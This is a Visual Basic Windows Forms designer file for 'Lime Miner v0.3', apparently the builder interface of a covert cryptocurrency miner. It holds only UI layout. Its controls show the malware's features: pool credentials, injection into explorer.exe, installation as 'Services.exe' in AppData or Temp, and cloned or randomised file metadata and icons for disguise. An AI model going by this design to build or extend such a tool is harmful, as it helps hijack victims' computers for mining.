<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class Form1
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form1))
        Me.BackgroundWorker1 = New System.ComponentModel.BackgroundWorker()
        Me.BackgroundWorker2 = New System.ComponentModel.BackgroundWorker()
        Me.Timer1 = New System.Windows.Forms.Timer(Me.components)
        Me.HuraForm1 = New Lime_Miner.HuraForm()
        Me.HuraControlBox1 = New Lime_Miner.HuraControlBox()
        Me.HuraTabControl1 = New Lime_Miner.HuraTabControl()
        Me.INF = New System.Windows.Forms.TabPage()
        Me.HuraAlertBox1 = New Lime_Miner.HuraAlertBox()
        Me.Label8 = New System.Windows.Forms.Label()
        Me.txtPoolURL = New Lime_Miner.HuraTextBox()
        Me.Label7 = New System.Windows.Forms.Label()
        Me.txtPoolPassowrd = New Lime_Miner.HuraTextBox()
        Me.Label6 = New System.Windows.Forms.Label()
        Me.txtPoolUsername = New Lime_Miner.HuraTextBox()
        Me.INS = New System.Windows.Forms.TabPage()
        Me.chkInstall = New Lime_Miner.HuraCheckBox()
        Me.Label2 = New System.Windows.Forms.Label()
        Me.txtInstallPathMain = New Lime_Miner.HuraComboBox()
        Me.Label5 = New System.Windows.Forms.Label()
        Me.txtInjection = New Lime_Miner.HuraComboBox()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.txtInstallFileName = New Lime_Miner.HuraTextBox()
        Me.ASM = New System.Windows.Forms.TabPage()
        Me.chkAssembly = New Lime_Miner.HuraCheckBox()
        Me.btn_assemblyRandom = New Lime_Miner.HuraButton()
        Me.btn_assemblyClone = New Lime_Miner.HuraButton()
        Me.num_Assembly4 = New Lime_Miner.HuraTextBox()
        Me.num_Assembly3 = New Lime_Miner.HuraTextBox()
        Me.num_Assembly2 = New Lime_Miner.HuraTextBox()
        Me.num_Assembly1 = New Lime_Miner.HuraTextBox()
        Me.txtTrademark = New Lime_Miner.HuraTextBox()
        Me.txtCompany = New Lime_Miner.HuraTextBox()
        Me.txtCopyright = New Lime_Miner.HuraTextBox()
        Me.txtDescription = New Lime_Miner.HuraTextBox()
        Me.txtProduct = New Lime_Miner.HuraTextBox()
        Me.txtTitle = New Lime_Miner.HuraTextBox()
        Me.ICO = New System.Windows.Forms.TabPage()
        Me.chkIcon = New Lime_Miner.HuraCheckBox()
        Me.picIcon = New System.Windows.Forms.PictureBox()
        Me.txtIconPath = New Lime_Miner.HuraTextBox()
        Me.btnBrowseIcon = New Lime_Miner.HuraButton()
        Me.BLD = New System.Windows.Forms.TabPage()
        Me.txtLog = New Lime_Miner.HuraTextBox()
        Me.btnBuild = New Lime_Miner.HuraButton()
        Me.HuraForm1.SuspendLayout()
        Me.HuraTabControl1.SuspendLayout()
        Me.INF.SuspendLayout()
        Me.INS.SuspendLayout()
        Me.ASM.SuspendLayout()
        Me.ICO.SuspendLayout()
        CType(Me.picIcon, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.BLD.SuspendLayout()
        Me.SuspendLayout()
        '
        'BackgroundWorker1
        '
        '
        'BackgroundWorker2
        '
        '
        'Timer1
        '
        Me.Timer1.Enabled = True
        Me.Timer1.Interval = 4000
        '
        'HuraForm1
        '
        Me.HuraForm1.AccentColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.HuraForm1.BackColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.HuraForm1.ColorScheme = Lime_Miner.HuraForm.ColorSchemes.Dark
        Me.HuraForm1.Controls.Add(Me.HuraControlBox1)
        Me.HuraForm1.Controls.Add(Me.HuraTabControl1)
        Me.HuraForm1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.HuraForm1.Font = New System.Drawing.Font("Segoe UI", 9.5!)
        Me.HuraForm1.ForeColor = System.Drawing.Color.Gray
        Me.HuraForm1.Location = New System.Drawing.Point(0, 0)
        Me.HuraForm1.Name = "HuraForm1"
        Me.HuraForm1.Size = New System.Drawing.Size(665, 477)
        Me.HuraForm1.TabIndex = 0
        Me.HuraForm1.Text = "Lime Miner v0.3"
        '
        'HuraControlBox1
        '
        Me.HuraControlBox1.AccentColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(219, Byte), Integer), CType(CType(106, Byte), Integer))
        Me.HuraControlBox1.Anchor = CType((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.HuraControlBox1.BackColor = System.Drawing.Color.Black
        Me.HuraControlBox1.ColorScheme = Lime_Miner.HuraControlBox.ColorSchemes.Dark
        Me.HuraControlBox1.ForeColor = System.Drawing.Color.Black
        Me.HuraControlBox1.Location = New System.Drawing.Point(509, 13)
        Me.HuraControlBox1.Name = "HuraControlBox1"
        Me.HuraControlBox1.Size = New System.Drawing.Size(100, 25)
        Me.HuraControlBox1.TabIndex = 1
        Me.HuraControlBox1.Text = "HuraControlBox1"
        '
        'HuraTabControl1
        '
        Me.HuraTabControl1.Appearance = System.Windows.Forms.TabAppearance.FlatButtons
        Me.HuraTabControl1.Controls.Add(Me.INF)
        Me.HuraTabControl1.Controls.Add(Me.INS)
        Me.HuraTabControl1.Controls.Add(Me.ASM)
        Me.HuraTabControl1.Controls.Add(Me.ICO)
        Me.HuraTabControl1.Controls.Add(Me.BLD)
        Me.HuraTabControl1.Font = New System.Drawing.Font("Segoe UI", 9.5!)
        Me.HuraTabControl1.ItemSize = New System.Drawing.Size(0, 30)
        Me.HuraTabControl1.Location = New System.Drawing.Point(12, 54)
        Me.HuraTabControl1.Name = "HuraTabControl1"
        Me.HuraTabControl1.SelectedIndex = 0
        Me.HuraTabControl1.Size = New System.Drawing.Size(628, 384)
        Me.HuraTabControl1.TabIndex = 0
        '
        'INF
        '
        Me.INF.BackColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.INF.Controls.Add(Me.HuraAlertBox1)
        Me.INF.Controls.Add(Me.Label8)
        Me.INF.Controls.Add(Me.txtPoolURL)
        Me.INF.Controls.Add(Me.Label7)
        Me.INF.Controls.Add(Me.txtPoolPassowrd)
        Me.INF.Controls.Add(Me.Label6)
        Me.INF.Controls.Add(Me.txtPoolUsername)
        Me.INF.Location = New System.Drawing.Point(4, 34)
        Me.INF.Name = "INF"
        Me.INF.Size = New System.Drawing.Size(620, 346)
        Me.INF.TabIndex = 6
        Me.INF.Text = "::Pool::"
        '
        'HuraAlertBox1
        '
        Me.HuraAlertBox1.AlertStyle = Lime_Miner.HuraAlertBox.Style.Simple
        Me.HuraAlertBox1.Font = New System.Drawing.Font("Trebuchet MS", 8.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.HuraAlertBox1.Location = New System.Drawing.Point(22, 238)
        Me.HuraAlertBox1.Name = "HuraAlertBox1"
        Me.HuraAlertBox1.Size = New System.Drawing.Size(571, 40)
        Me.HuraAlertBox1.TabIndex = 16
        Me.HuraAlertBox1.Text = " "
        Me.HuraAlertBox1.Visible = False
        '
        'Label8
        '
        Me.Label8.AutoSize = True
        Me.Label8.Location = New System.Drawing.Point(17, 148)
        Me.Label8.Name = "Label8"
        Me.Label8.Size = New System.Drawing.Size(45, 25)
        Me.Label8.TabIndex = 15
        Me.Label8.Text = "URL"
        '
        'txtPoolURL
        '
        Me.txtPoolURL.BackColor = System.Drawing.Color.Transparent
        Me.txtPoolURL.BackgroundColour = System.Drawing.Color.Black
        Me.txtPoolURL.BorderColour = System.Drawing.Color.FromArgb(CType(CType(180, Byte), Integer), CType(CType(180, Byte), Integer), CType(CType(180, Byte), Integer))
        Me.txtPoolURL.Location = New System.Drawing.Point(126, 141)
        Me.txtPoolURL.MaxLength = 32767
        Me.txtPoolURL.Multiline = False
        Me.txtPoolURL.Name = "txtPoolURL"
        Me.txtPoolURL.ReadOnly = False
        Me.txtPoolURL.Size = New System.Drawing.Size(467, 38)
        Me.txtPoolURL.Style = Lime_Miner.HuraTextBox.Styles.Normal
        Me.txtPoolURL.TabIndex = 14
        Me.txtPoolURL.Text = "..."
        Me.txtPoolURL.TextAlign = System.Windows.Forms.HorizontalAlignment.Left
        Me.txtPoolURL.TextColour = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.txtPoolURL.UseSystemPasswordChar = False
        '
        'Label7
        '
        Me.Label7.AutoSize = True
        Me.Label7.Location = New System.Drawing.Point(17, 95)
        Me.Label7.Name = "Label7"
        Me.Label7.Size = New System.Drawing.Size(54, 25)
        Me.Label7.TabIndex = 13
        Me.Label7.Text = "PWD"
        '
        'txtPoolPassowrd
        '
        Me.txtPoolPassowrd.BackColor = System.Drawing.Color.Transparent
        Me.txtPoolPassowrd.BackgroundColour = System.Drawing.Color.Black
        Me.txtPoolPassowrd.BorderColour = System.Drawing.Color.FromArgb(CType(CType(180, Byte), Integer), CType(CType(180, Byte), Integer), CType(CType(180, Byte), Integer))
        Me.txtPoolPassowrd.Location = New System.Drawing.Point(126, 88)
        Me.txtPoolPassowrd.MaxLength = 32767
        Me.txtPoolPassowrd.Multiline = False
        Me.txtPoolPassowrd.Name = "txtPoolPassowrd"
        Me.txtPoolPassowrd.ReadOnly = False
        Me.txtPoolPassowrd.Size = New System.Drawing.Size(467, 38)
        Me.txtPoolPassowrd.Style = Lime_Miner.HuraTextBox.Styles.Normal
        Me.txtPoolPassowrd.TabIndex = 12
        Me.txtPoolPassowrd.Text = "..."
        Me.txtPoolPassowrd.TextAlign = System.Windows.Forms.HorizontalAlignment.Left
        Me.txtPoolPassowrd.TextColour = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.txtPoolPassowrd.UseSystemPasswordChar = False
        '
        'Label6
        '
        Me.Label6.AutoSize = True
        Me.Label6.Location = New System.Drawing.Point(17, 39)
        Me.Label6.Name = "Label6"
        Me.Label6.Size = New System.Drawing.Size(56, 25)
        Me.Label6.TabIndex = 11
        Me.Label6.Text = "USER"
        '
        'txtPoolUsername
        '
        Me.txtPoolUsername.BackColor = System.Drawing.Color.Transparent
        Me.txtPoolUsername.BackgroundColour = System.Drawing.Color.Black
        Me.txtPoolUsername.BorderColour = System.Drawing.Color.FromArgb(CType(CType(180, Byte), Integer), CType(CType(180, Byte), Integer), CType(CType(180, Byte), Integer))
        Me.txtPoolUsername.Location = New System.Drawing.Point(126, 32)
        Me.txtPoolUsername.MaxLength = 32767
        Me.txtPoolUsername.Multiline = False
        Me.txtPoolUsername.Name = "txtPoolUsername"
        Me.txtPoolUsername.ReadOnly = False
        Me.txtPoolUsername.Size = New System.Drawing.Size(467, 38)
        Me.txtPoolUsername.Style = Lime_Miner.HuraTextBox.Styles.Normal
        Me.txtPoolUsername.TabIndex = 10
        Me.txtPoolUsername.Text = "..."
        Me.txtPoolUsername.TextAlign = System.Windows.Forms.HorizontalAlignment.Left
        Me.txtPoolUsername.TextColour = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.txtPoolUsername.UseSystemPasswordChar = False
        '
        'INS
        '
        Me.INS.BackColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.INS.Controls.Add(Me.chkInstall)
        Me.INS.Controls.Add(Me.Label2)
        Me.INS.Controls.Add(Me.txtInstallPathMain)
        Me.INS.Controls.Add(Me.Label5)
        Me.INS.Controls.Add(Me.txtInjection)
        Me.INS.Controls.Add(Me.Label1)
        Me.INS.Controls.Add(Me.txtInstallFileName)
        Me.INS.Location = New System.Drawing.Point(4, 34)
        Me.INS.Name = "INS"
        Me.INS.Size = New System.Drawing.Size(620, 346)
        Me.INS.TabIndex = 3
        Me.INS.Text = "::Install::"
        '
        'chkInstall
        '
        Me.chkInstall.BaseColour = System.Drawing.Color.Black
        Me.chkInstall.BorderColour = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(219, Byte), Integer), CType(CType(106, Byte), Integer))
        Me.chkInstall.Checked = False
        Me.chkInstall.CheckedColour = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(219, Byte), Integer), CType(CType(106, Byte), Integer))
        Me.chkInstall.Cursor = System.Windows.Forms.Cursors.Hand
        Me.chkInstall.FontColour = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.chkInstall.Location = New System.Drawing.Point(18, 23)
        Me.chkInstall.Name = "chkInstall"
        Me.chkInstall.Size = New System.Drawing.Size(166, 22)
        Me.chkInstall.TabIndex = 21
        Me.chkInstall.Text = "Install OFF"
        '
        'Label2
        '
        Me.Label2.AutoSize = True
        Me.Label2.Location = New System.Drawing.Point(13, 125)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(50, 25)
        Me.Label2.TabIndex = 19
        Me.Label2.Text = "Path"
        '
        'txtInstallPathMain
        '
        Me.txtInstallPathMain.AccentColor = System.Drawing.Color.Black
        Me.txtInstallPathMain.BackColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.txtInstallPathMain.ColorScheme = Lime_Miner.HuraComboBox.ColorSchemes.Dark
        Me.txtInstallPathMain.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed
        Me.txtInstallPathMain.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
        Me.txtInstallPathMain.Enabled = False
        Me.txtInstallPathMain.Font = New System.Drawing.Font("Segoe UI", 9.5!)
        Me.txtInstallPathMain.ForeColor = System.Drawing.Color.Black
        Me.txtInstallPathMain.FormattingEnabled = True
        Me.txtInstallPathMain.Items.AddRange(New Object() {"Temp", "AppData", "UserProfile"})
        Me.txtInstallPathMain.Location = New System.Drawing.Point(122, 122)
        Me.txtInstallPathMain.Name = "txtInstallPathMain"
        Me.txtInstallPathMain.Size = New System.Drawing.Size(246, 34)
        Me.txtInstallPathMain.TabIndex = 18
        '
        'Label5
        '
        Me.Label5.AutoSize = True
        Me.Label5.Location = New System.Drawing.Point(13, 74)
        Me.Label5.Name = "Label5"
        Me.Label5.Size = New System.Drawing.Size(85, 25)
        Me.Label5.TabIndex = 17
        Me.Label5.Text = "Injection"
        '
        'txtInjection
        '
        Me.txtInjection.AccentColor = System.Drawing.Color.Black
        Me.txtInjection.BackColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.txtInjection.ColorScheme = Lime_Miner.HuraComboBox.ColorSchemes.Dark
        Me.txtInjection.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed
        Me.txtInjection.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
        Me.txtInjection.Font = New System.Drawing.Font("Segoe UI", 9.5!)
        Me.txtInjection.ForeColor = System.Drawing.Color.Black
        Me.txtInjection.FormattingEnabled = True
        Me.txtInjection.Items.AddRange(New Object() {"explorer.exe"})
        Me.txtInjection.Location = New System.Drawing.Point(122, 71)
        Me.txtInjection.Name = "txtInjection"
        Me.txtInjection.Size = New System.Drawing.Size(246, 34)
        Me.txtInjection.TabIndex = 16
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.Location = New System.Drawing.Point(13, 183)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(91, 25)
        Me.Label1.TabIndex = 9
        Me.Label1.Text = "FileName"
        '
        'txtInstallFileName
        '
        Me.txtInstallFileName.BackColor = System.Drawing.Color.Transparent
        Me.txtInstallFileName.BackgroundColour = System.Drawing.Color.Black
        Me.txtInstallFileName.BorderColour = System.Drawing.Color.FromArgb(CType(CType(180, Byte), Integer), CType(CType(180, Byte), Integer), CType(CType(180, Byte), Integer))
        Me.txtInstallFileName.Enabled = False
        Me.txtInstallFileName.Location = New System.Drawing.Point(122, 174)
        Me.txtInstallFileName.MaxLength = 32767
        Me.txtInstallFileName.Multiline = False
        Me.txtInstallFileName.Name = "txtInstallFileName"
        Me.txtInstallFileName.ReadOnly = False
        Me.txtInstallFileName.Size = New System.Drawing.Size(246, 38)
        Me.txtInstallFileName.Style = Lime_Miner.HuraTextBox.Styles.Normal
        Me.txtInstallFileName.TabIndex = 8
        Me.txtInstallFileName.Text = "Services.exe"
        Me.txtInstallFileName.TextAlign = System.Windows.Forms.HorizontalAlignment.Left
        Me.txtInstallFileName.TextColour = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.txtInstallFileName.UseSystemPasswordChar = False
        '
        'ASM
        '
        Me.ASM.BackColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.ASM.Controls.Add(Me.chkAssembly)
        Me.ASM.Controls.Add(Me.btn_assemblyRandom)
        Me.ASM.Controls.Add(Me.btn_assemblyClone)
        Me.ASM.Controls.Add(Me.num_Assembly4)
        Me.ASM.Controls.Add(Me.num_Assembly3)
        Me.ASM.Controls.Add(Me.num_Assembly2)
        Me.ASM.Controls.Add(Me.num_Assembly1)
        Me.ASM.Controls.Add(Me.txtTrademark)
        Me.ASM.Controls.Add(Me.txtCompany)
        Me.ASM.Controls.Add(Me.txtCopyright)
        Me.ASM.Controls.Add(Me.txtDescription)
        Me.ASM.Controls.Add(Me.txtProduct)
        Me.ASM.Controls.Add(Me.txtTitle)
        Me.ASM.Location = New System.Drawing.Point(4, 34)
        Me.ASM.Name = "ASM"
        Me.ASM.Padding = New System.Windows.Forms.Padding(3)
        Me.ASM.Size = New System.Drawing.Size(620, 346)
        Me.ASM.TabIndex = 2
        Me.ASM.Text = "::Assembly::"
        '
        'chkAssembly
        '
        Me.chkAssembly.BaseColour = System.Drawing.Color.Black
        Me.chkAssembly.BorderColour = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(219, Byte), Integer), CType(CType(106, Byte), Integer))
        Me.chkAssembly.Checked = False
        Me.chkAssembly.CheckedColour = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(219, Byte), Integer), CType(CType(106, Byte), Integer))
        Me.chkAssembly.Cursor = System.Windows.Forms.Cursors.Hand
        Me.chkAssembly.FontColour = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.chkAssembly.Location = New System.Drawing.Point(10, 17)
        Me.chkAssembly.Name = "chkAssembly"
        Me.chkAssembly.Size = New System.Drawing.Size(166, 22)
        Me.chkAssembly.TabIndex = 21
        Me.chkAssembly.Text = "OFF"
        '
        'btn_assemblyRandom
        '
        Me.btn_assemblyRandom.BackColor = System.Drawing.Color.Transparent
        Me.btn_assemblyRandom.BaseColour = System.Drawing.Color.Black
        Me.btn_assemblyRandom.BorderColour = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(219, Byte), Integer), CType(CType(106, Byte), Integer))
        Me.btn_assemblyRandom.Enabled = False
        Me.btn_assemblyRandom.FontColour = System.Drawing.Color.WhiteSmoke
        Me.btn_assemblyRandom.HoverColour = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.btn_assemblyRandom.Location = New System.Drawing.Point(482, 226)
        Me.btn_assemblyRandom.Name = "btn_assemblyRandom"
        Me.btn_assemblyRandom.PressedColour = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(219, Byte), Integer), CType(CType(106, Byte), Integer))
        Me.btn_assemblyRandom.ProgressColour = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(191, Byte), Integer), CType(CType(255, Byte), Integer))
        Me.btn_assemblyRandom.Size = New System.Drawing.Size(116, 38)
        Me.btn_assemblyRandom.TabIndex = 5
        Me.btn_assemblyRandom.Text = "Random"
        '
        'btn_assemblyClone
        '
        Me.btn_assemblyClone.BackColor = System.Drawing.Color.Transparent
        Me.btn_assemblyClone.BaseColour = System.Drawing.Color.Black
        Me.btn_assemblyClone.BorderColour = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(219, Byte), Integer), CType(CType(106, Byte), Integer))
        Me.btn_assemblyClone.Enabled = False
        Me.btn_assemblyClone.FontColour = System.Drawing.Color.WhiteSmoke
        Me.btn_assemblyClone.HoverColour = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.btn_assemblyClone.Location = New System.Drawing.Point(334, 226)
        Me.btn_assemblyClone.Name = "btn_assemblyClone"
        Me.btn_assemblyClone.PressedColour = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(219, Byte), Integer), CType(CType(106, Byte), Integer))
        Me.btn_assemblyClone.ProgressColour = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(191, Byte), Integer), CType(CType(255, Byte), Integer))
        Me.btn_assemblyClone.Size = New System.Drawing.Size(116, 38)
        Me.btn_assemblyClone.TabIndex = 6
        Me.btn_assemblyClone.Text = "Clone"
        '
        'num_Assembly4
        '
        Me.num_Assembly4.BackColor = System.Drawing.Color.Transparent
        Me.num_Assembly4.BackgroundColour = System.Drawing.Color.Black
        Me.num_Assembly4.BorderColour = System.Drawing.Color.FromArgb(CType(CType(180, Byte), Integer), CType(CType(180, Byte), Integer), CType(CType(180, Byte), Integer))
        Me.num_Assembly4.Enabled = False
        Me.num_Assembly4.Location = New System.Drawing.Point(130, 226)
        Me.num_Assembly4.MaxLength = 32767
        Me.num_Assembly4.Multiline = False
        Me.num_Assembly4.Name = "num_Assembly4"
        Me.num_Assembly4.ReadOnly = False
        Me.num_Assembly4.Size = New System.Drawing.Size(34, 38)
        Me.num_Assembly4.Style = Lime_Miner.HuraTextBox.Styles.Normal
        Me.num_Assembly4.TabIndex = 1
        Me.num_Assembly4.Text = "0"
        Me.num_Assembly4.TextAlign = System.Windows.Forms.HorizontalAlignment.Left
        Me.num_Assembly4.TextColour = System.Drawing.Color.WhiteSmoke
        Me.num_Assembly4.UseSystemPasswordChar = False
        '
        'num_Assembly3
        '
        Me.num_Assembly3.BackColor = System.Drawing.Color.Transparent
        Me.num_Assembly3.BackgroundColour = System.Drawing.Color.Black
        Me.num_Assembly3.BorderColour = System.Drawing.Color.FromArgb(CType(CType(180, Byte), Integer), CType(CType(180, Byte), Integer), CType(CType(180, Byte), Integer))
        Me.num_Assembly3.Enabled = False
        Me.num_Assembly3.Location = New System.Drawing.Point(90, 226)
        Me.num_Assembly3.MaxLength = 32767
        Me.num_Assembly3.Multiline = False
        Me.num_Assembly3.Name = "num_Assembly3"
        Me.num_Assembly3.ReadOnly = False
        Me.num_Assembly3.Size = New System.Drawing.Size(34, 38)
        Me.num_Assembly3.Style = Lime_Miner.HuraTextBox.Styles.Normal
        Me.num_Assembly3.TabIndex = 2
        Me.num_Assembly3.Text = "0"
        Me.num_Assembly3.TextAlign = System.Windows.Forms.HorizontalAlignment.Left
        Me.num_Assembly3.TextColour = System.Drawing.Color.WhiteSmoke
        Me.num_Assembly3.UseSystemPasswordChar = False
        '
        'num_Assembly2
        '
        Me.num_Assembly2.BackColor = System.Drawing.Color.Transparent
        Me.num_Assembly2.BackgroundColour = System.Drawing.Color.Black
        Me.num_Assembly2.BorderColour = System.Drawing.Color.FromArgb(CType(CType(180, Byte), Integer), CType(CType(180, Byte), Integer), CType(CType(180, Byte), Integer))
        Me.num_Assembly2.Enabled = False
        Me.num_Assembly2.Location = New System.Drawing.Point(50, 226)
        Me.num_Assembly2.MaxLength = 32767
        Me.num_Assembly2.Multiline = False
        Me.num_Assembly2.Name = "num_Assembly2"
        Me.num_Assembly2.ReadOnly = False
        Me.num_Assembly2.Size = New System.Drawing.Size(34, 38)
        Me.num_Assembly2.Style = Lime_Miner.HuraTextBox.Styles.Normal
        Me.num_Assembly2.TabIndex = 3
        Me.num_Assembly2.Text = "0"
        Me.num_Assembly2.TextAlign = System.Windows.Forms.HorizontalAlignment.Left
        Me.num_Assembly2.TextColour = System.Drawing.Color.WhiteSmoke
        Me.num_Assembly2.UseSystemPasswordChar = False
        '
        'num_Assembly1
        '
        Me.num_Assembly1.BackColor = System.Drawing.Color.Transparent
        Me.num_Assembly1.BackgroundColour = System.Drawing.Color.Black
        Me.num_Assembly1.BorderColour = System.Drawing.Color.FromArgb(CType(CType(180, Byte), Integer), CType(CType(180, Byte), Integer), CType(CType(180, Byte), Integer))
        Me.num_Assembly1.Enabled = False
        Me.num_Assembly1.Location = New System.Drawing.Point(10, 226)
        Me.num_Assembly1.MaxLength = 32767
        Me.num_Assembly1.Multiline = False
        Me.num_Assembly1.Name = "num_Assembly1"
        Me.num_Assembly1.ReadOnly = False
        Me.num_Assembly1.Size = New System.Drawing.Size(34, 38)
        Me.num_Assembly1.Style = Lime_Miner.HuraTextBox.Styles.Normal
        Me.num_Assembly1.TabIndex = 4
        Me.num_Assembly1.Text = "0"
        Me.num_Assembly1.TextAlign = System.Windows.Forms.HorizontalAlignment.Left
        Me.num_Assembly1.TextColour = System.Drawing.Color.WhiteSmoke
        Me.num_Assembly1.UseSystemPasswordChar = False
        '
        'txtTrademark
        '
        Me.txtTrademark.BackColor = System.Drawing.Color.Transparent
        Me.txtTrademark.BackgroundColour = System.Drawing.Color.Black
        Me.txtTrademark.BorderColour = System.Drawing.Color.FromArgb(CType(CType(180, Byte), Integer), CType(CType(180, Byte), Integer), CType(CType(180, Byte), Integer))
        Me.txtTrademark.Enabled = False
        Me.txtTrademark.Location = New System.Drawing.Point(334, 169)
        Me.txtTrademark.MaxLength = 32767
        Me.txtTrademark.Multiline = False
        Me.txtTrademark.Name = "txtTrademark"
        Me.txtTrademark.ReadOnly = False
        Me.txtTrademark.Size = New System.Drawing.Size(264, 38)
        Me.txtTrademark.Style = Lime_Miner.HuraTextBox.Styles.Normal
        Me.txtTrademark.TabIndex = 0
        Me.txtTrademark.Text = "Trademark"
        Me.txtTrademark.TextAlign = System.Windows.Forms.HorizontalAlignment.Left
        Me.txtTrademark.TextColour = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.txtTrademark.UseSystemPasswordChar = False
        '
        'txtCompany
        '
        Me.txtCompany.BackColor = System.Drawing.Color.Transparent
        Me.txtCompany.BackgroundColour = System.Drawing.Color.Black
        Me.txtCompany.BorderColour = System.Drawing.Color.FromArgb(CType(CType(180, Byte), Integer), CType(CType(180, Byte), Integer), CType(CType(180, Byte), Integer))
        Me.txtCompany.Enabled = False
        Me.txtCompany.Location = New System.Drawing.Point(10, 169)
        Me.txtCompany.MaxLength = 32767
        Me.txtCompany.Multiline = False
        Me.txtCompany.Name = "txtCompany"
        Me.txtCompany.ReadOnly = False
        Me.txtCompany.Size = New System.Drawing.Size(264, 38)
        Me.txtCompany.Style = Lime_Miner.HuraTextBox.Styles.Normal
        Me.txtCompany.TabIndex = 0
        Me.txtCompany.Text = "Company"
        Me.txtCompany.TextAlign = System.Windows.Forms.HorizontalAlignment.Left
        Me.txtCompany.TextColour = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.txtCompany.UseSystemPasswordChar = False
        '
        'txtCopyright
        '
        Me.txtCopyright.BackColor = System.Drawing.Color.Transparent
        Me.txtCopyright.BackgroundColour = System.Drawing.Color.Black
        Me.txtCopyright.BorderColour = System.Drawing.Color.FromArgb(CType(CType(180, Byte), Integer), CType(CType(180, Byte), Integer), CType(CType(180, Byte), Integer))
        Me.txtCopyright.Enabled = False
        Me.txtCopyright.Location = New System.Drawing.Point(334, 114)
        Me.txtCopyright.MaxLength = 32767
        Me.txtCopyright.Multiline = False
        Me.txtCopyright.Name = "txtCopyright"
        Me.txtCopyright.ReadOnly = False
        Me.txtCopyright.Size = New System.Drawing.Size(264, 38)
        Me.txtCopyright.Style = Lime_Miner.HuraTextBox.Styles.Normal
        Me.txtCopyright.TabIndex = 0
        Me.txtCopyright.Text = "Copyright"
        Me.txtCopyright.TextAlign = System.Windows.Forms.HorizontalAlignment.Left
        Me.txtCopyright.TextColour = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.txtCopyright.UseSystemPasswordChar = False
        '
        'txtDescription
        '
        Me.txtDescription.BackColor = System.Drawing.Color.Transparent
